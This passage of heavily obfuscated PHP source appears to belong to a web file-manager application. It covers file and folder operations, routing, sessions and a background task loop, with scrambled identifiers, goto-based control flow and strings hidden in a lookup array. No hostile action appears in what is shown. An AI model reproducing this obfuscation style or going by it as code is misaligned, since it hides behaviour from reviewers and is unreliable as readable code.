public function mkfile($b´‡‰Ö´, $BïóÅŒˆ› = '', $Bâ„©£Œâ = REPEAT_RENAME) { $b´‡‰Ö´ = $this->iconvSystem($b´‡‰Ö´); @touch($b´‡‰Ö´); if ($BïóÅŒˆ›) { file_put_contents($b´‡‰Ö´, $BïóÅŒˆ›); } return is_file($b´‡‰Ö´) ? $this->getPathOuter($b´‡‰Ö´) : !1; } public function mkdir($a™æìåŒ±¶, $dÓ¾îßÎì  = REPEAT_SKIP) { $a™æìåŒ±¶ = $this->iconvSystem($a™æìåŒ±¶); if (is_dir($a™æìåŒ±¶)) { return $this->getPathOuter($a™æìåŒ±¶); } @mkdir($a™æìåŒ±¶, 511, !0); return is_dir($a™æìåŒ±¶) ? $this->getPathOuter($a™æìåŒ±¶) : !1; } public function copyFile($c“ç‚‰¥é, $Fì¡óïŸìë) { $this->mkdir($this->pathFather($Fì¡óïŸìë)); $c“ç‚‰¥é = $this->iconvSystem($c“ç‚‰¥é); $Fì¡óïŸìë = $this->iconvSystem($Fì¡óïŸìë); $aÊ’¤Í…Ô = @copy($c“ç‚‰¥é, $Fì¡óïŸìë); return $aÊ’¤Í…Ô ? $this->getPathOuter($Fì¡óïŸìë) : !1; } public function moveFile($BÂç÷²ÁÑ™, $CÛ¥±ç‹Œƒ) { $this->mkdir($this->pathFather($CÛ¥±ç‹Œƒ)); $BÂç÷²ÁÑ™ = $this->iconvSystem($BÂç÷²ÁÑ™); $CÛ¥±ç‹Œƒ = $this->iconvSystem($CÛ¥±ç‹Œƒ); $fñ–µòôã¨ = intval(@rename($BÂç÷²ÁÑ™, $CÛ¥±ç‹Œƒ)); if (!$fñ–µòôã¨) { if ($fñ–µòôã¨ = intval(@copy($BÂç÷²ÁÑ™, $CÛ¥±ç‹Œƒ))) { @unlink($BÂç÷²ÁÑ™); } } return $fñ–µòôã¨ ? $this->getPathOuter($CÛ¥±ç‹Œƒ) : !1; } public function delFile($F¤ŠàŒã¥) { $F¤ŠàŒã¥ = $this->iconvSystem($F¤ŠàŒã¥); if (!@unlink($F¤ŠàŒã¥)) { @chmod($F¤ŠàŒã¥, 511); if (!@unlink($F¤ŠàŒã¥)) { return !1; } } else { return !0; } } public function delFolder($C™òô²£•) { goto Aóê¸±Ê«Ø; A”ŒˆÖÖŠ†: if (!($FèÈ“ššíÚ = opendir($C™òô²£•))) { return !1; } while (($E•˜ùµñÇ = readdir($FèÈ“ššíÚ)) !== !1) { if ($E•˜ùµñÇ == $cÍŒö‡¡‘‹[101] || $E•˜ùµñÇ == $cÍŒö‡¡‘‹[1168]) { continue; } $DòŸ…‘ìœ£ = $C™òô²£• . $cÍŒö‡¡‘‹[8] . $E•˜ùµñÇ; if (is_file($DòŸ…‘ìœ£) || is_link($DòŸ…‘ìœ£)) { if (!unlink($DòŸ…‘ìœ£)) { chmod($DòŸ…‘ìœ£, 511); if (!unlink($DòŸ…‘ìœ£)) { return !1; } } } else { if (is_dir($DòŸ…‘ìœ£)) { chmod($DòŸ…‘ìœ£, 511); $DòŸ…‘ìœ£ = $this->iconvApp($DòŸ…‘ìœ£); if (!$this->delFolder($DòŸ…‘ìœ£)) { return !1; } } } } closedir($FèÈ“ššíÚ); goto F¬ÅÔœÍ´; F¬ÅÔœÍ´: return rmdir($C™òô²£•); goto Bî¾÷‡ĞÂ·; Aóê¸±Ê«Ø: $cÍŒö‡¡‘‹ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C™òô²£• = $this->iconvSystem($C™òô²£•); if (!is_dir($C™òô²£•)) { return !0; } goto A”ŒˆÖÖŠ†; Bî¾÷‡ĞÂ·: } public function rename($b½±“âî½„, $d„ŞóÛ©à²) { goto D‰ÍØëÕÅ—; D‰ÍØëÕÅ—: $C¬øŒŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b”ÂàÖ©ºÇ = $this->fileNameAuto($this->pathFather($b½±“âî½„), $d„ŞóÛ©à²); $b”ÂàÖ©ºÇ = $this->iconvSystem($b”ÂàÖ©ºÇ); goto Cç¨ƒëâ§; C´á÷œÅË“: $E“¹ä–ÄÇ = @rename($b½±“âî½„, $dæÆİÚÔ®Ó); $dæÆİÚÔ®Ó = $this->iconvApp($dæÆİÚÔ®Ó); return $E“¹ä–ÄÇ ? $this->getPathOuter($dæÆİÚÔ®Ó) : !1; goto A¨ÎÂœÀÈ; Cç¨ƒëâ§: $b½±“âî½„ = $this->iconvSystem($b½±“âî½„); $e´‹‰œ¦ù = $this->pathFather($b½±“âî½„); $dæÆİÚÔ®Ó = rtrim($e´‹‰œ¦ù, $C¬øŒŒ[8]) . $C¬øŒŒ[8] . $b”ÂàÖ©ºÇ; goto C´á÷œÅË“; A¨ÎÂœÀÈ: } public function size($B•Í¾‰è) { $B•Í¾‰è = $this->iconvSystem($B•Í¾‰è); return (double) abs(sprintf($_SERVER[¶ªÕß‚ØÁŸ][1170], @filesize($B•Í¾‰è))); } public function info($C™Ñ®ïÕ„¦) { $C™Ñ®ïÕ„¦ = $this->iconvSystem($C™Ñ®ïÕ„¦); if ($this->isFolder($C™Ñ®ïÕ„¦)) { return $this->folderInfo($C™Ñ®ïÕ„¦); } else { if ($this->isFile($C™Ñ®ïÕ„¦)) { return $this->fileInfo($C™Ñ®ïÕ„¦); } } return !1; } protected function infoChildren($bİ»ÍÖ‹â, &$dâÓäŞ¤‡, $aŒè„°ÃîÉ = true) { goto Eùá‚ò¾Ñ÷; Eùá‚ò¾Ñ÷: $CŞàíèš—• =& $_SERVER[¶ªÕß‚ØÁŸ]; check_abort(); $bİ»ÍÖ‹â = rtrim($bİ»ÍÖ‹â, $CŞàíèš—•[8]) . $CŞàíèš—•[8]; goto dìç©Õ¶‡; dìç©Õ¶‡: if ($aŒè„°ÃîÉ) { $bİ»ÍÖ‹â = $this->iconvSystem($bİ»ÍÖ‹â); } if (!($eî‘„£ç‚ = @opendir($bİ»ÍÖ‹â))) { return; } while (($B–§íø‡Ğ = readdir($eî‘„£ç‚)) !== !1) { if ($B–§íø‡Ğ == $CŞàíèš—•[101] || $B–§íø‡Ğ == $CŞàíèš—•[1168]) { continue; } $Cİô¥ˆ¨Ïé = $bİ»ÍÖ‹â . $B–§íø‡Ğ; if (is_file($Cİô¥ˆ¨Ïé) || is_link($Cİô¥ˆ¨Ïé)) { $dâÓäŞ¤‡[$CŞàíèš—•[88]]++; $dâÓäŞ¤‡[$CŞàíèš—•[87]] += (double) abs(sprintf($CŞàíèš—•[1170], @filesize($Cİô¥ˆ¨Ïé))); } else { if (is_dir($Cİô¥ˆ¨Ïé)) { $dâÓäŞ¤‡[$CŞàíèš—•[89]]++; $this->infoChildren($Cİô¥ˆ¨Ïé, $dâÓäŞ¤‡, !1); } } } goto Cğğåš”óâ; Cğğåš”óâ: closedir($eî‘„£ç‚); goto F½»‡İĞ¼; F½»‡İĞ¼: } private function folderInfo($c¨ÆÏÇùÖ, $f·¯¸åÏ‰ = false) { $b¯áæÂçàÏ =& $_SERVER[¶ªÕß‚ØÁŸ]; $c¨ÆÏÇùÖ = rtrim($c¨ÆÏÇùÖ, $b¯áæÂçàÏ[8]) . $b¯áæÂçàÏ[8]; $AâÅæ—¶× = $this->iconvApp($this->pathThis($c¨ÆÏÇùÖ)); if ($f·¯¸åÏ‰) { return array($b¯áæÂçàÏ[28] => $AâÅæ—¶×, $b¯áæÂçàÏ[85] => $this->getPathOuter($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[29] => $b¯áæÂçàÏ[86]); } $AÁˆÊ†îğğ = array($b¯áæÂçàÏ[28] => $AâÅæ—¶×, $b¯áæÂçàÏ[85] => $this->getPathOuter($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[29] => $b¯áæÂçàÏ[86], $b¯áæÂçàÏ[197] => @filectime($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[117] => @filemtime($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[1171] => @fileatime($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[1165] => is_readable($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[1166] => is_writable($c¨ÆÏÇùÖ), $b¯áæÂçàÏ[1172] => get_mode($c¨ÆÏÇùÖ)); return $AÁˆÊ†îğğ; } private function fileInfo($Eçˆ™÷ßÁô, $f“¿²Ø»ÆÃ = false) { $E‘Ëß¡šä– =& $_SERVER[¶ªÕß‚ØÁŸ]; $bñª‡åÚİ¼ = $this->iconvApp($this->pathThis($Eçˆ™÷ßÁô)); if ($f“¿²Ø»ÆÃ) { return array($E‘Ëß¡šä–[28] => $bñª‡åÚİ¼, $E‘Ëß¡šä–[85] => $this->getPathOuter($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[29] => $E‘Ëß¡šä–[177], $E‘Ëß¡šä–[87] => $this->size($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[170] => $this->ext($bñª‡åÚİ¼)); } $dÚ§ªàÎå = array($E‘Ëß¡šä–[28] => $bñª‡åÚİ¼, $E‘Ëß¡šä–[85] => $this->getPathOuter($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[29] => $E‘Ëß¡šä–[177], $E‘Ëß¡šä–[197] => @filectime($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[117] => @filemtime($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[1171] => @fileatime($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[87] => $this->size($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[170] => $this->ext($bñª‡åÚİ¼), $E‘Ëß¡šä–[1165] => is_readable($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[1166] => is_writable($Eçˆ™÷ßÁô), $E‘Ëß¡šä–[1172] => get_mode($Eçˆ™÷ßÁô)); return $dÚ§ªàÎå; } public function exist($F¯ÏÕÅ²) { $F¯ÏÕÅ² = $this->iconvSystem($F¯ÏÕÅ²); return @file_exists($F¯ÏÕÅ²); } public function isFile($AÚÕ†öáÒ˜) { $AÚÕ†öáÒ˜ = $this->iconvSystem($AÚÕ†öáÒ˜); return @is_file($AÚÕ†öáÒ˜); } public function isFolder($Bß„™’ª’¶) { $Bß„™’ª’¶ = $this->iconvSystem($Bß„™’ª’¶); return @is_dir($Bß„™’ª’¶); } public function listPath($B¡İµŒ’Œ‚, $bÕ¡Ş»æ¢² = false) { goto C…†’®œò¸; aÒ·…ñì²: closedir($C·à—Ãˆ); return $fÕÖ¤˜Ëƒ¬; goto D†ˆ¼Ë”óƒ; eòÍ¹‡ÁŒÏ: $fÕÖ¤˜Ëƒ¬ = array($cåÏ†·§µ‘[84] => array(), $cåÏ†·§µ‘[83] => array()); if (!($C·à—Ãˆ = @opendir($B¡İµŒ’Œ‚))) { return $fÕÖ¤˜Ëƒ¬; } while (($C­­ÒœÎá = readdir($C·à—Ãˆ)) !== !1) { if ($C­­ÒœÎá == $cåÏ†·§µ‘[101] || $C­­ÒœÎá == $cåÏ†·§µ‘[1168]) { continue; } $bÜÌØ˜ÕàÁ = $B¡İµŒ’Œ‚ . $C­­ÒœÎá; if (is_file($bÜÌØ˜ÕàÁ)) { $fÕÖ¤˜Ëƒ¬[$cåÏ†·§µ‘[83]][] = $this->fileInfo($bÜÌØ˜ÕàÁ, $bÕ¡Ş»æ¢²); } else { $fÕÖ¤˜Ëƒ¬[$cåÏ†·§µ‘[84]][] = $this->folderInfo($bÜÌØ˜ÕàÁ, $bÕ¡Ş»æ¢²); } } goto aÒ·…ñì²; C…†’®œò¸: $cåÏ†·§µ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¡İµŒ’Œ‚ = $this->iconvSystem($B¡İµŒ’Œ‚); $B¡İµŒ’Œ‚ = rtrim($B¡İµŒ’Œ‚, $cåÏ†·§µ‘[8]) . $cåÏ†·§µ‘[8]; goto eòÍ¹‡ÁŒÏ; D†ˆ¼Ë”óƒ: } public function listAll($EéÎ‹÷¨ÍÍ, &$dÆ»‚ÙïÉ = array()) { goto C³„¶÷”À…; aƒ¤™Ù³²ã: return $dÆ»‚ÙïÉ; goto b§õ°ºĞ; C³„¶÷”À…: $bè°¤†³Æï =& $_SERVER[¶ªÕß‚ØÁŸ]; $EéÎ‹÷¨ÍÍ = $this->iconvSystem($EéÎ‹÷¨ÍÍ); $EéÎ‹÷¨ÍÍ = rtrim($EéÎ‹÷¨ÍÍ, $bè°¤†³Æï[8]) . $bè°¤†³Æï[8]; goto F¥¬©È·¤; F¥¬©È·¤: if (!($c±ÍŠôÃó÷ = @opendir($EéÎ‹÷¨ÍÍ))) { return $dÆ»‚ÙïÉ; } while (($FÚ»ÍÚÈÆ = readdir($c±ÍŠôÃó÷)) !== !1) { if ($FÚ»ÍÚÈÆ == $bè°¤†³Æï[101] || $FÚ»ÍÚÈÆ == $bè°¤†³Æï[1168]) { continue; } $d½îåÉãÇ¾ = $EéÎ‹÷¨ÍÍ . $FÚ»ÍÚÈÆ; if (is_dir($d½îåÉãÇ¾) && !is_link($d½îåÉãÇ¾)) { $dÆ»‚ÙïÉ[] = array($bè°¤†³Æï[85] => $d½îåÉãÇ¾ . $bè°¤†³Æï[8], $bè°¤†³Æï[86] => 1, $bè°¤†³Æï[117] => @filemtime($d½îåÉãÇ¾), $bè°¤†³Æï[87] => 0); $this->listAll($d½îåÉãÇ¾, $dÆ»‚ÙïÉ); } else { $dÆ»‚ÙïÉ[] = array($bè°¤†³Æï[85] => $d½îåÉãÇ¾, $bè°¤†³Æï[86] => 0, $bè°¤†³Æï[117] => @filemtime($d½îåÉãÇ¾), $bè°¤†³Æï[87] => $this->size($d½îåÉãÇ¾)); } } closedir($c±ÍŠôÃó÷); goto aƒ¤™Ù³²ã; b§õ°ºĞ: } public function has($d‹ğ¡Î»Û•, $Aˆ³Ö©œ¿ = false, $Eô¡ùŠÉÁŒ = true) { goto d¸ŒÛÓàò‚; d¸ŒÛÓàò‚: $c«ÌÙ¦Ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $d‹ğ¡Î»Û• = $this->iconvSystem($d‹ğ¡Î»Û•); $d‹ğ¡Î»Û• = rtrim($d‹ğ¡Î»Û•, $c«ÌÙ¦Ó[8]) . $c«ÌÙ¦Ó[8]; goto F³Şƒ¸ğ×Æ; f´ª©ˆŠ‘“: if ($Aˆ³Ö©œ¿) { return array($c«ÌÙ¦Ó[201] => $aÏÛ ­ö‚Æ, $c«ÌÙ¦Ó[202] => $DæØÕÌá±À); } return !1; goto b–¶Ó‡‹°Ü; Aµô‡œ§: $Eá…·©Š¢â = 0; while (($E´±èÌ¤×â = readdir($Cõøïã¯á)) !== !1) { if ($E´±èÌ¤×â == $c«ÌÙ¦Ó[101] || $E´±èÌ¤×â == $c«ÌÙ¦Ó[1168]) { continue; } $C†â›â¢¬ª = $d‹ğ¡Î»Û• . $E´±èÌ¤×â; if ($Aˆ³Ö©œ¿) { $Eá…·©Š¢â++; if (@is_file($C†â›â¢¬ª)) { $aÏÛ ­ö‚Æ++; } else { $DæØÕÌá±À++; } if ($Eá…·©Š¢â > 10000) { break; } continue; } if ($Eô¡ùŠÉÁŒ) { if (@is_file($C†â›â¢¬ª)) { return !0; } } else { if (@is_dir($C†â›â¢¬ª . $c«ÌÙ¦Ó[8])) { return !0; } } } closedir($Cõøïã¯á); goto f´ª©ˆŠ‘“; F³Şƒ¸ğ×Æ: if (!($Cõøïã¯á = @opendir($d‹ğ¡Î»Û•))) { return !1; } $aÏÛ ­ö‚Æ = 0; $DæØÕÌá±À = 0; goto Aµô‡œ§; b–¶Ó‡‹°Ü: } public function hashSimple($EÑ÷´ê÷Ø ) { goto EåÑëÔ°ˆ; a¥‘Ú Áè: if ($EìŸáªÁ <= $D‰«õñàƒ * $fÈóç‘Ú‰¨) { return $this->hashMd5($EÑ÷´ê÷Ø ) . $EìŸáªÁ; } $b¤–©Ì›‰ä = $Bá¨·´ƒ¨Œ[33]; $b„©½¤’Ë = intval($EìŸáªÁ / $fÈóç‘Ú‰¨); goto dÓâÊÙšŒ; dÓâÊÙšŒ: $fÏßƒÄ„¥ = fopen($EÑ÷´ê÷Ø , $Bá¨·´ƒ¨Œ[1173]); if (!$fÏßƒÄ„¥) { return $b¤–©Ì›‰ä; } for ($dåæà‚Õ»ù = 0; $dåæà‚Õ»ù < $fÈóç‘Ú‰¨; $dåæà‚Õ»ù++) { fseek($fÏßƒÄ„¥, $b„©½¤’Ë * $dåæà‚Õ»ù); $b¤–©Ì›‰ä .= fread($fÏßƒÄ„¥, $D‰«õñàƒ); } goto D¥çùŞ¯; D¥çùŞ¯: fseek($fÏßƒÄ„¥, $EìŸáªÁ - $D‰«õñàƒ); $b¤–©Ì›‰ä .= fread($fÏßƒÄ„¥, $D‰«õñàƒ); fclose($fÏßƒÄ„¥); goto eî¬ÈÔ½éØ; Cù‰èÎƒ: $EìŸáªÁ = $this->size($EÑ÷´ê÷Ø ); $D‰«õñàƒ = 200; $fÈóç‘Ú‰¨ = 50; goto a¥‘Ú Áè; eî¬ÈÔ½éØ: return md5($b¤–©Ì›‰ä) . $EìŸáªÁ; goto DÉÚ¹·ø; EåÑëÔ°ˆ: $Bá¨·´ƒ¨Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$EÑ÷´ê÷Ø ) { return md5($Bá¨·´ƒ¨Œ[33]); } $EÑ÷´ê÷Ø  = $this->iconvSystem($EÑ÷´ê÷Ø ); goto Cù‰èÎƒ; DÉÚ¹·ø: } public function getContent($A‹ÄÀŒö†±) { $A‹ÄÀŒö†± = $this->iconvSystem($A‹ÄÀŒö†±); return file_get_contents($A‹ÄÀŒö†±); } public function setContent($bÑâ¶‹‘ğ, $DÜ’¥À«Ó„ = '') { $bÑâ¶‹‘ğ = $this->iconvSystem($bÑâ¶‹‘ğ); @file_put_contents($bÑâ¶‹‘ğ, $DÜ’¥À«Ó„, LOCK_EX); clearstatcache(); return strlen($DÜ’¥À«Ó„) == filesize($bÑâ¶‹‘ğ); } public function fileSubstr($b‰‘À•‚±, $EÔô“›’©„ = 0, $cî‘÷Œà‘š = false) { goto f¥Âá®º‘; f¥Âá®º‘: $e‘Å…·‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $b‰‘À•‚± = $this->iconvSystem($b‰‘À•‚±); if ($cî‘÷Œà‘š === !1) { $cî‘÷Œà‘š = $this->size($b‰‘À•‚±); } goto eåÅ¯ŸØ» ; b¯¯°¿ÔŸğ: return $bÜµáô£À; goto càÀ¤ø‹Èö; AğÛ˜Ô…Íæ: fseek($F‡Æêˆ’­², $EÔô“›’©„); $bÜµáô£À = fread($F‡Æêˆ’­², $cî‘÷Œà‘š); fclose($F‡Æêˆ’­²); goto b¯¯°¿ÔŸğ; eåÅ¯ŸØ» : if ($cî‘÷Œà‘š <= 0) { return $e‘Å…·‡[33]; } $F‡Æêˆ’­² = fopen($b‰‘À•‚±, $e‘Å…·‡[1173]); if (!$F‡Æêˆ’­²) { return !1; } goto AğÛ˜Ô…Íæ; càÀ¤ø‹Èö: } public function upload($AŸÜÈ»äÆî, $B›¸—à—¶, $bÕ¤Ó»ƒ¿ò = false, $b†èùßŒ™Å = REPEAT_REPLACE) { $Bù§×©ìôÙ = $this->copyFile($B›¸—à—¶, $AŸÜÈ»äÆî); return $Bù§×©ìôÙ ? $this->getPathOuter($AŸÜÈ»äÆî) : !1; } public function download($d„„ˆ˜‰¾ß, $fœÃ¥¹á¯¬) { return $this->iconvSystem($d„„ˆ˜‰¾ß); } } goto F…÷´äÖÄ; cÎ‹Œ„˜æ¿: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\x5e\57\135\x2b", "\x3a\x6e\x75\x6d" => "\x5b\60\x2d\x39\135\53", "\x3a\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($d¥ØÑĞ“õí, $e·ÑÊª…†Û) { $eôÏŸÁ¤ÃÖ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($d¥ØÑĞ“õí == $eôÏŸÁ¤ÃÖ[1389]) { $Cí¦šáØ¢ = array_map($eôÏŸÁ¤ÃÖ[1390], $e·ÑÊª…†Û[0]); $b†ÊÇ«ñ± = strpos($e·ÑÊª…†Û[1], $eôÏŸÁ¤ÃÖ[8]) === 0 ? $e·ÑÊª…†Û[1] : $eôÏŸÁ¤ÃÖ[8] . $e·ÑÊª…†Û[1]; $añƒÒñ…° = $e·ÑÊª…†Û[2]; } else { $Cí¦šáØ¢ = null; $b†ÊÇ«ñ± = strpos($e·ÑÊª…†Û[0], $eôÏŸÁ¤ÃÖ[8]) === 0 ? $e·ÑÊª…†Û[0] : $eôÏŸÁ¤ÃÖ[8] . $e·ÑÊª…†Û[0]; $añƒÒñ…° = $e·ÑÊª…†Û[1]; } array_push(self::$maps, $Cí¦šáØ¢); array_push(self::$routes, $b†ÊÇ«ñ±); array_push(self::$methods, strtoupper($d¥ØÑĞ“õí)); array_push(self::$callbacks, $añƒÒñ…°); } public static function error($Cïß¬‰) { self::$errorCallback = $Cïß¬‰; } public static function haltOnMatch($CËòÎ½áœ = true) { self::$halts = $CËòÎ½áœ; } public static function dispatch() { goto f…‚“©Ï”Ü; aŒÀ‡Öƒ: self::$routes = preg_replace($F²†´ä¼ù÷[1077], $F²†´ä¼ù÷[8], self::$routes); if (in_array($bœõ¼“·†š, self::$routes)) { $E²òõĞá« = array_keys(self::$routes, $bœõ¼“·†š); foreach ($E²òõĞá« as $BÁĞŒÁÜ±Ì) { if (self::$methods[$BÁĞŒÁÜ±Ì] == $EÎÓÔ¥È || self::$methods[$BÁĞŒÁÜ±Ì] == $F²†´ä¼ù÷[1392] || in_array($EÎÓÔ¥È, self::$maps[$BÁĞŒÁÜ±Ì])) { $aäàó‰½áç = !0; if (!is_object(self::$callbacks[$BÁĞŒÁÜ±Ì])) { $cğ—¤½ˆš´ = explode($F²†´ä¼ù÷[8], self::$callbacks[$BÁĞŒÁÜ±Ì]); $f¦¨ù¨ñÆ = end($cğ—¤½ˆš´); $a¿±»ÒŒÈ‚ = explode($F²†´ä¼ù÷[1393], $f¦¨ù¨ñÆ); $Dª¢Õ“³ = new $a¿±»ÒŒÈ‚[0](); $Dª¢Õ“³->{$a¿±»ÒŒÈ‚[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$BÁĞŒÁÜ±Ì]); if (self::$halts) { return; } } } } } else { $Aµ–¢¥‘®Á = 0; foreach (self::$routes as $BÁĞŒÁÜ±Ì) { if (strpos($BÁĞŒÁÜ±Ì, $F²†´ä¼ù÷[4]) !== !1) { $BÁĞŒÁÜ±Ì = str_replace($D‹Û‡’„È, $BÅ–©«Èî, $BÁĞŒÁÜ±Ì); } if (preg_match($F²†´ä¼ù÷[1394] . $BÁĞŒÁÜ±Ì . $F²†´ä¼ù÷[1395], $bœõ¼“·†š, $FÖ†„Œ‡Ö©)) { if (self::$methods[$Aµ–¢¥‘®Á] == $EÎÓÔ¥È || self::$methods[$Aµ–¢¥‘®Á] == $F²†´ä¼ù÷[1392] || !empty(self::$maps[$Aµ–¢¥‘®Á]) && in_array($EÎÓÔ¥È, self::$maps[$Aµ–¢¥‘®Á])) { $aäàó‰½áç = !0; array_shift($FÖ†„Œ‡Ö©); if (!is_object(self::$callbacks[$Aµ–¢¥‘®Á])) { $cğ—¤½ˆš´ = explode($F²†´ä¼ù÷[8], self::$callbacks[$Aµ–¢¥‘®Á]); $f¦¨ù¨ñÆ = end($cğ—¤½ˆš´); $a¿±»ÒŒÈ‚ = explode($F²†´ä¼ù÷[1393], $f¦¨ù¨ñÆ); $Dª¢Õ“³ = new $a¿±»ÒŒÈ‚[0](); if (!method_exists($Dª¢Õ“³, $a¿±»ÒŒÈ‚[1])) { echo $F²†´ä¼ù÷[1396]; } else { call_user_func_array(array($Dª¢Õ“³, $a¿±»ÒŒÈ‚[1]), $FÖ†„Œ‡Ö©); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Aµ–¢¥‘®Á], $FÖ†„Œ‡Ö©); if (self::$halts) { return; } } } } $Aµ–¢¥‘®Á++; } } if ($aäàó‰½áç == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DÈ°³æÎãè =& $_SERVER[¶ªÕß‚ØÁŸ]; header($_SERVER[$DÈ°³æÎãè[1397]] . $DÈ°³æÎãè[1398]); echo $DÈ°³æÎãè[1399]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$F²†´ä¼ù÷[1391]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto fã„à–ÊŸ; f…‚“©Ï”Ü: $F²†´ä¼ù÷ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bœõ¼“·†š = parse_url($_SERVER[$F²†´ä¼ù÷[1391]], PHP_URL_PATH); $EÎÓÔ¥È = $_SERVER[$F²†´ä¼ù÷[164]]; goto FÀ¤ÒÑõÇµ; FÀ¤ÒÑõÇµ: $D‹Û‡’„È = array_keys(static::$patterns); $BÅ–©«Èî = array_values(static::$patterns); $aäàó‰½áç = !1; goto aŒÀ‡Öƒ; fã„à–ÊŸ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto a®¹˜”İº«; a®¹˜”İº«: $Cî ß—É•© =& $_SERVER[¶ªÕß‚ØÁŸ]; static $Böíì‘ÒÌŒ = false; if ($Böíì‘ÒÌŒ) { return $Böíì‘ÒÌŒ; } goto F×ÓŞ¯; a¨ƒ¹Ë•¢¡: $A ×¿§ğŞ = $F¯Àš„ëÜ[$Cî ß—É•©[1402]]; $D…¼¶¿¦Ü§ = $F¯Àš„ëÜ[$A ×¿§ğŞ]; $B³îİ‹µ«¶ = $F¯Àš„ëÜ[$Cî ß—É•©[768]]; goto Dñİ¤Ï­ôä; E±§´œ·¹»: return $Böíì‘ÒÌŒ; goto DÎŠ¡¯óÒ­; Dñİ¤Ï­ôä: switch ($A ×¿§ğŞ) { case $Cî ß—É•©[17]: self::$handle = Model($Cî ß—É•©[769]); break; case $Cî ß—É•©[770]: self::$handle = new CacheRedis($D…¼¶¿¦Ü§, $B³îİ‹µ«¶); break; case $Cî ß—É•©[771]: self::$handle = new CacheMemcached($D…¼¶¿¦Ü§, $B³îİ‹µ«¶); break; case $Cî ß—É•©[177]: $D…¼¶¿¦Ü§[$Cî ß—É•©[85]] = $D…¼¶¿¦Ü§[$Cî ß—É•©[85]] . $Cî ß—É•©[1403]; self::$handle = new CacheFile($D…¼¶¿¦Ü§, $B³îİ‹µ«¶); default: break; } if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Böíì‘ÒÌŒ = new self(); goto E±§´œ·¹»; aÛÃÜ¢”ÑÃ: $b’àÓóŸĞ… = _get($GLOBALS, $Cî ß—É•©[1401], $b’àÓóŸĞ…); if (self::$sessionSign) { } else { if (Cookie::get($b’àÓóŸĞ…)) { self::$sessionSign = Cookie::get($b’àÓóŸĞ…); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b’àÓóŸĞ…, self::$sessionSign, self::$sessionTime); goto a¨ƒ¹Ë•¢¡; F×ÓŞ¯: $F¯Àš„ëÜ = $GLOBALS[$Cî ß—É•©[6]][$Cî ß—É•©[346]]; self::$sessionTime = $F¯Àš„ëÜ[$Cî ß—É•©[1400]]; $b’àÓóŸĞ… = SESSION_ID; goto aÛÃÜ¢”ÑÃ; DÎŠ¡¯óÒ­: } public static function sign($Fšì„éÁ©È = false) { $Fšì„éÁ©È && (self::$sessionSign = $Fšì„éÁ©È); self::init(); return self::$sessionSign; } public static function set($Fó¹‘ô‚Ôì, $B·ÜİÜİÎ† = false) { self::init(); if (is_array($Fó¹‘ô‚Ôì)) { foreach ($Fó¹‘ô‚Ôì as $a •¿®«Ö => $dí°›— æ—) { array_set_value(self::$data, $a •¿®«Ö, $dí°›— æ—); } } else { array_set_value(self::$data, $Fó¹‘ô‚Ôì, $B·ÜİÜİÎ†); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($f’ñİÁÎ… = false) { self::init(); if (!$f’ñİÁÎ…) { return self::$data; } return array_get_value(self::$data, $f’ñİÁÎ…); } public static function remove($DËğ™ø‡öŒ) { self::init(); unset(self::$data[$DËğ™ø‡öŒ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¶ªÕß‚ØÁŸ][773])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto eÜäõŞ¾ªç; AßÌô¢´: http_close(); self::valueSet($c‰Ø›İ†ñ·[1404], $c‰Ø›İ†ñ·[93]); Hook::bind($c‰Ø›İ†ñ·[1406], $c‰Ø›İ†ñ·[1407]); goto DÚÓ„Óù°…; DÚÓ„Óù°…: while (!0) { self::cacheClear(); if (self::valueGet($c‰Ø›İ†ñ·[702]) != $c‰Ø›İ†ñ·[93]) { self::valueSet($c‰Ø›İ†ñ·[1404], $c‰Ø›İ†ñ·[476]); self::log($c‰Ø›İ†ñ·[1408]); die; } self::valueSet($c‰Ø›İ†ñ·[1404], $c‰Ø›İ†ñ·[93]); self::valueSet($c‰Ø›İ†ñ·[1405], time()); self::taskRunAll(); sleep(self::valueGet($c‰Ø›İ†ñ·[1409])); } goto Eƒ±ì®ŒŠ“; eÜäõŞ¾ªç: $c‰Ø›İ†ñ· =& 